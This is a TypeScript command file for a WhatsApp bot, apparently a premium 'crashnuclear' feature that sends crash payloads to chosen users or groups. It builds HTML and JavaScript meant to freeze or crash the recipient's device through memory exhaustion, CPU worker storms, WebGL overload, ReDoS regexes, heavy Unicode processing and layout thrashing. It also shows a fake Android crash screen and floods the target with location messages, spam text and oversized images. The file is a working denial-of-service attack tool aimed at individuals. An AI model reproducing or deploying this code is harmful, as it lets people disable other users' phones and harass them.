import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ═══════════════════════════ utilidades ═══════════════════════════ */

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const CSS = (a: string) => `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#04070a;color:#cfe9ff;font:10.5px/1.45 ui-monospace,Menlo,monospace;padding:9px;overflow:hidden}
#b{display:flex;gap:5px;align-items:center;border-bottom:1px solid #12283d;padding-bottom:5px;margin-bottom:7px}
#b i{width:6px;height:6px;border-radius:50%;background:${a};box-shadow:0 0 8px ${a};animation:k .7s steps(2) infinite;flex:none}
#b b{color:${a};font-size:9px;letter-spacing:1.4px}
#b s{margin-left:auto;color:#33586f;text-decoration:none;font-size:9px}
@keyframes k{50%{opacity:.1}}
#st{color:${a};font-size:9.5px;white-space:pre-wrap;word-break:break-all;margin-bottom:4px}
#st b{color:#fff}
canvas{width:100%;height:180px;display:block;border:1px solid #12283d}
#pg{height:3px;background:#0a1724;margin-top:6px}
#pg i{display:block;height:100%;width:0;background:${a};transition:width .3s}
.f{font-size:8.5px;color:#2b4a5f;margin-top:5px;display:flex;justify-content:space-between}
</style>`;

const shell = (a: string, title: string, body: string) =>
  `${CSS(a)}<div id="b"><i></i><b>${title}</b><s>crash</s></div>${body}`;

/* ═══════════════════════════ payloads ═══════════════════════════ */

const MEM = (lv: number) => {
  const N = 3 + lv * 3;
  const MB = 192 + lv * 320;
  const CNC = 2 + lv;
  const SZ = [14000 + lv * 2500, 16384, 12288, 8192];
  return shell(
    "#ff2e63",
    "OOM / HEAP",
    `<div id="st">init</div><canvas id="c"></canvas><div id="pg"><i></i></div>
<div class="f"><span>wasm + arraybuffer + canvas</span><span id="mb">0 MB</span></div>
<script>
var K=[],mb=0,st=document.getElementById('st'),mbE=document.getElementById('mb'),pg=document.querySelector('#pg i');
function f(t){st.textContent=t}
function up(n){mb+=n;mbE.textContent=mb+' MB';pg.style.width=Math.min(100,mb/60)+'%'}
try{var w=new WebAssembly.Memory({initial:32768,maximum:32768});new Uint8Array(w.buffer).fill(1);K.push(w);up(2048)}catch(e){}
f('buffers');
for(var i=0;i<${N};i++){try{var ab=new ArrayBuffer(${MB}*1048576);new Uint8Array(ab).fill(i+1);K.push(ab);up(${MB})}catch(e){f('tope '+mb+'MB');break}}
f('canvas');
var L=${JSON.stringify(SZ)};
for(var j=0;j<${CNC};j++){for(var q=0;q<L.length;q++){try{var cv=document.createElement('canvas');cv.width=L[q];cv.height=L[q];cv.getContext('2d').fillRect(0,0,L[q],L[q]);K.push(cv);up(Math.round(L[q]*L[q]*4/1048576));break}catch(e){}}}
try{for(var o=0;o<${lv};o++){var oc=new OffscreenCanvas(8192,8192);oc.getContext('2d').fillRect(0,0,9,9);K.push(oc);up(256)}}catch(e){}
f('presionando '+mb+'MB');
var t=Date.now();while(Date.now()-t<900000){}
</script>`,
  );
};

const CPU = (lv: number) => {
  const W = 2 + lv;
  return shell(
    "#ffb02e",
    "SPIN / WORKERS",
    `<div id="st">arrancando</div><canvas id="c"></canvas>
<div class="f"><span id="hc">?</span><span id="fr">0 fps</span></div>
<script>
var st=document.getElementById('st'),frE=document.getElementById('fr'),c=document.getElementById('c');
var g=c.getContext('2d'),f=0,last=0;
c.width=400;c.height=180;
try{
  var src='onmessage=function(){var a=new Float64Array(8192),v=1.7;while(true){for(var i=0;i<8192;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
  var n=Math.max(8,(navigator.hardwareConcurrency||8)*${W});
  document.getElementById('hc').textContent=n+' workers';
  st.textContent='cpu saturada';
  for(var i=0;i<n;i++){try{new Worker(u).postMessage(1)}catch(e){}}
}catch(e){}
for(var t=0;t<${80*lv};t++)setInterval(function(){},0);
(function loop(now){
  f++;if(now-last>1000){frE.textContent=f+' fps';f=0;last=now}
  g.fillStyle='rgba(4,7,10,.35)';g.fillRect(0,0,400,180);
  g.fillStyle='#ffb02e';
  for(var k=0;k<40;k++){g.fillRect((Math.sin(now/300+k)*180)+200,(Math.cos(now/200+k*2)*80)+90,2,2)}
  requestAnimationFrame(loop);
})(0);
</script>`,
  );
};

const GPU = (lv: number) => {
  const CTX = 1 + lv;
  const TEX = 6 + lv * 6;
  const IT = 3000 + lv * 3000;
  return shell(
    "#00e5ff",
    "GPU / WEBGL",
    `<div id="st">compilando</div><canvas id="c"></canvas>
<div class="f"><span>${CTX} ctx · ${TEX} tex 2048²</span><span id="fr">0 fps</span></div>
<script>
var st=document.getElementById('st'),frE=document.getElementById('fr'),f=0,last=0,GL=[];
for(var i=0;i<${CTX};i++){
  try{
    var cv=document.createElement('canvas');cv.width=900;cv.height=600;
    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance',preserveDrawingBuffer:false});
    if(!gl)continue;
    for(var t=0;t<${TEX};t++){var tx=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,tx);gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,2048,2048,0,gl.RGBA,gl.UNSIGNED_BYTE,null);gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR)}
    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.4;uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;for(int i=0;i<${IT};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;if(dot(z,z)>4.)break;it++;}float k=it/${IT}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var bf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,bf);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var po=gl.getAttribLocation(pr,'p');gl.enableVertexAttribArray(po);gl.vertexAttribPointer(po,2,gl.FLOAT,false,0,0);
    GL.push({gl:gl,pr:pr,t:gl.getUniformLocation(pr,'t'),r:gl.getUniformLocation(pr,'r'),cv:cv});
  }catch(e){}
}
st.textContent=GL.length+' contextos vivos';
(function loop(now){
  f++;if(now-last>1000){frE.textContent=f+' fps';f=0;last=now}
  for(var i=0;i<GL.length;i++){var G=GL[i];G.gl.viewport(0,0,G.cv.width,G.cv.height);G.gl.uniform1f(G.t,now*0.001);G.gl.uniform2f(G.r,G.cv.width,G.cv.height);G.gl.drawArrays(G.gl.TRIANGLES,0,6)}
  requestAnimationFrame(loop);
})(0);
</script>`,
  );
};

const ICU = (lv: number) => {
  const NRM = 3000000 * lv;
  const SRT = 80000 * lv;
  const CLN = 40000;
  return shell(
    "#a855f7",
    "ICU / TEXTO",
    `<div id="st">init</div><div id="pg"><i></i></div>
<div class="f"><span>NFD · collator · clone · redos</span><span id="ph">0</span></div>
<script>
var K=[],st=document.getElementById('st'),ph=document.getElementById('ph'),pg=document.querySelector('#pg i'),n=0;
function f(t){st.textContent=t}
function step(){n++;ph.textContent=n+'/5';pg.style.width=(n*20)+'%'}
try{var s='\\u034f'.repeat(${NRM});step();K.push(s.normalize('NFD'));step();K.push(s.normalize('NFC'));K.push(s.toLocaleUpperCase('tr'));step()}catch(e){f('icu '+e.message)}
try{var a=[];for(var i=0;i<${SRT};i++)a.push('\\u00fc'+Math.random());a.sort(new Intl.Collator().compare);K.push(a);step()}catch(e){f('sort '+e.message)}
try{var d={v:'█'.repeat(2000)};for(var j=0;j<${CLN};j++)d={c:d};K.push(structuredClone(d));step()}catch(e){f('clone '+e.message)}
f('redos');
try{/^(a+)+$/.test('a'.repeat(40)+'!')}catch(e){}
try{/^(x+x+)+y$/.test('x'.repeat(40)+'!')}catch(e){}
try{/^(\\w+\\s?)+$/.test('ab '.repeat(50)+'!')}catch(e){}
try{/^(a|a)+$/.test('a'.repeat(42)+'!')}catch(e){}
try{/^(.*a){14}$/.test('a'.repeat(42)+'!')}catch(e){}
f('lista '+n+'/5');
</script>`,
  );
};

const LAYOUT = (lv: number) => {
  const TH = 4000 * lv;
  const BLK = 120 * lv;
  return shell(
    "#22c55e",
    "REFLOW THRASH",
    `<div id="st">init</div><div id="host" style="position:relative;height:120px;overflow:hidden"></div>
<div class="f"><span id="n">0 lecturas</span><span>${BLK} bloques</span></div>
<script>
var st=document.getElementById('st'),nE=document.getElementById('n'),host=document.getElementById('host'),n=0;
try{
  for(var i=0;i<${BLK};i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:6px;height:6px;background:hsl('+(i*3)+',90%,55%);animation:sp '+(1+i%7)+'s linear infinite';host.appendChild(d)}
  var k=document.createElement('style');k.textContent='@keyframes sp{to{transform:rotate(360deg) scale(2)}}';document.head.appendChild(k);
  var p=document.createElement('div');p.style.cssText='position:absolute;width:1px;height:1px';host.appendChild(p);
  for(var t=0;t<${TH};t++){
    p.style.width=(t%60)+1+'px';p.getBoundingClientRect();
    host.style.paddingTop=(t%3)+'px';host.offsetHeight;
    if(t%500===0){n+=500;nE.textContent=n+' lecturas'}
  }
  st.textContent='layout sacudido';
}catch(e){st.textContent=e.message}
</script>`,
  );
};

const LINKER = () => {
  const SO = "/data/user/0/com.whatsapp/cache/.gmscore/lib/arm64-v8a/libmapbox-gl.so";
  const F = [
    "NativeConnectivityListener.initialize(Native Method)",
    "NativeConnectivityListener.<init>(NativeConnectivityListener.java:27)",
    "ConnectivityReceiver.instance(ConnectivityReceiver.java:44)",
    "Mapbox.getInstance(Mapbox.java:100)",
    "LiteGoogleMapImpl.onCreate(LiteGoogleMap.kt:209)",
    "MapViewImpl.onCreate(MapView.kt:42)",
    "IMapViewDelegate$Stub.onTransact(IMapViewDelegate.java:110)",
    "MapViewImpl.onTransact(MapView.kt:79)",
    "android.os.Binder.transact(Binder.java:1164)",
    "X.3xZ.run(:922)",
    "android.os.Handler.handleCallback(Handler.java:942)",
    "android.app.ActivityThread.main(ActivityThread.java:7924)",
    "com.android.internal.os.ZygoteInit.main(ZygoteInit.java:936)",
  ];
  return `${CSS("#ff3b5c")}
<div id="b"><i></i><b>FATAL EXCEPTION</b><s>pid 28206 · sdk 37</s></div>
<div style="color:#4d7a5c;font-size:9px;white-space:pre-wrap;word-break:break-all;margin-bottom:6px">
W System: Attempt to load writable file: ${SO}
E Mbgl-LibraryLoader: Failed to load native shared library.
E MultiArchLoader.kt:58 → catch(Exception) no atrapa java.lang.Error
</div>
<div style="border-left:2px solid #ff3b5c;background:#120a0c;padding:5px 7px">
<div style="color:#ff3b5c;font-weight:700">java.lang.UnsatisfiedLinkError</div>
<div style="color:#e8b9c1;font-size:9.5px;word-break:break-all;margin-top:3px">No implementation found for void com.mapbox.mapboxsdk.net.NativeConnectivityListener.initialize()</div>
</div>
<div id="tr" style="margin-top:5px">${F.map(
    (s, i) =>
      `<div style="color:${i === 0 ? "#ffd98a" : "#7fae8d"};font-size:9px;padding-left:18px;position:relative"><span style="position:absolute;left:0;color:#2c5340">${String(i).padStart(2, "0")}</span>${s.replace(/</g, "&lt;")}</div>`,
  ).join("")}</div>
<div class="f"><span>compat 463348571 · chmod 0444</span><span>main abortado</span></div>`;
};

/* ═══════════════════════════ capa WhatsApp ═══════════════════════════ */

const WA = async (sock: any, jid: string, lv: number, log: string[]) => {
  const push = async (content: any) => {
    try { await sock.sendMessage(jid, content); }
    catch (e: any) { log.push(e?.message || String(e)); }
  };

  for (let i = 0; i < 2 + lv; i++) {
    await push({
      location: {
        degreesLatitude: 4.5981 + i * 0.01,
        degreesLongitude: -74.0758 - i * 0.01,
        name: "向导书呆子锁测试",
        address: `LuferOS · ${i}`,
      },
    });
    await sleep(140);
  }

  for (let i = 0; i < 3 + lv; i++) {
    await push({
      text: `foi bruxo de novo man${"K".repeat(12)}\n@srbruxomp5 no youtube crlh${"K".repeat(4)}\nhttps://chat.whatsapp.com/${"A".repeat(22)}`,
      contextInfo: { forwardingScore: 999, isForwarded: true },
    });
    await sleep(120);
  }

  for (let i = 0; i < 3 + lv; i++) {
    await push({
      image: { url: `https://picsum.photos/seed/nuke${i}x${lv}/3600/3600` },
      caption: "向导书呆子锁测试",
    });
  }

  // peer inexistente: fuerza PEER_ID_INVALID
  for (let i = 0; i < 1 + (lv > 1 ? 1 : 0); i++) {
    try { await sock.sendMessage(`00000000000${i}@s.whatsapp.net`, { text: "PEER" }); }
    catch (e: any) { log.push(`PEER_ID_INVALID`); }
  }
};

/* ═══════════════════════════ registro ═══════════════════════════ */

type Mod = {
  id: string;
  emoji: string;
  label: string;
  desc: string;
  build?: (lv: number) => string;
  wa?: boolean;
};

const MODULES: Mod[] = [
  { id: "mem", emoji: "🧠", label: "MEM / OOM", desc: "WASM 2 GB + ArrayBuffers + canvas 16000²", build: MEM },
  { id: "gpu", emoji: "🔥", label: "GPU / WEBGL", desc: "contextos múltiples, texturas 2048², shader 12000 iter", build: GPU },
  { id: "cpu", emoji: "⚙️", label: "SPIN / WORKERS", desc: "todos los núcleos + tormenta de timers", build: CPU },
  { id: "icu", emoji: "🔤", label: "ICU / TEXTO", desc: "NFD 9M, collator, structuredClone, ReDoS", build: ICU },
  { id: "layout", emoji: "📐", label: "REFLOW THRASH", desc: "12000 lecturas síncronas + bloques animados", build: LAYOUT },
  { id: "linker", emoji: "🪲", label: "LINKER / MAPBOX", desc: "UnsatisfiedLinkError, .so escribible SDK 37", build: LINKER },
  { id: "wa", emoji: "📡", label: "WA / MEDIA", desc: "ubicaciones, reenviados, imágenes 3600², PEER_ID_INVALID", wa: true },
];

/* ═══════════════════════════ comando ═══════════════════════════ */

export default {
  name: ["crashnuclear", "nuclear", "nuke", "crashx"],
  category: "group",
  premiumOnly: true,
  description: "Crasheo por clases: mem, gpu, cpu, icu, layout, linker, wa. Sin subcomando = nuclear (todas).",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const first = (args[0] || "").toLowerCase();
    const ids = MODULES.map((m) => m.id);

    if (["lista", "ls", "menu", "help"].includes(first)) {
      await react("📋").catch(() => undefined);
      return reply(
        `${fytBold("Crashnuclear")} — clases disponibles\n\n` +
          MODULES.map((m) => `${m.emoji} ${fytBold(`.crashnuclear ${m.id}`)} — ${m.desc}`).join("\n") +
          `\n\n☢️ ${fytBold(".crashnuclear all")} — todas en orden de daño\n` +
          `Nivel 1-3 opcional al final.`,
      ).catch(() => undefined);
    }

    let sel: Mod[];
    if (["all", "todo", "nuclear", "full"].includes(first)) sel = MODULES;
    else if (ids.includes(first)) sel = MODULES.filter((m) => m.id === first);
    else sel = MODULES;

    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || (sel.length === 1 ? 3 : 2);

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = info.mentionedJid || [];
    const quoted: string | undefined = info.participant;
    const raw = (args.find((a) => /^\d{8,}$/.test(a.replace(/\D/g, ""))) || "").replace(/\D/g, "");

    let targets: string[];
    let priv: boolean;
    if (mentioned.length) { targets = mentioned; priv = true; }
    else if (raw.length >= 8) { targets = [`${raw}@s.whatsapp.net`]; priv = true; }
    else if (quoted) { targets = [quoted]; priv = true; }
    else { targets = [from]; priv = false; }

    await react(sel.length > 1 ? "☢️" : "💥").catch(() => undefined);

    const send = async (jid: string, m: Mod, level: number) => {
      if (m.wa) return WA(sock, jid, level, errors);
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle(`${m.emoji} ${m.label}`)
        .setFooter(`clase ${m.id} · nivel ${level}`);
      rich.addSection(m.build!(level));
      return rich.send(jid);
    };

    const errors: string[] = [];
    let ok = 0;

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];
      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      const passes = priv && sel.length === 1 ? 3 + lv : 1;

      for (let p = 0; p < passes; p++) {
        for (const m of sel) {
          try { await send(t, m, lv); ok++; }
          catch (e: any) { errors.push(e?.message || String(e)); }
          await sleep(sel.length > 1 ? 320 : 200);
        }
        if (priv) await sleep(240);
      }
    }

    await react(errors.length ? "🩹" : "☠️").catch(() => undefined);

    const peer = errors.some((e) => /PEER_ID_INVALID/i.test(e));
    await reply(
      `${fytBold(sel.length > 1 ? "Nuclear" : sel[0].id)} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 pasada, sin tags)"}\n` +
        `Nivel ${lv} · ${sel.length} clases · ${ok} ok${errors.length ? ` · ${errors.length} fallos` : ""}` +
        (peer ? `\n⚠️ PEER_ID_INVALID` : ""),
    ).catch(() => undefined);
  },
};
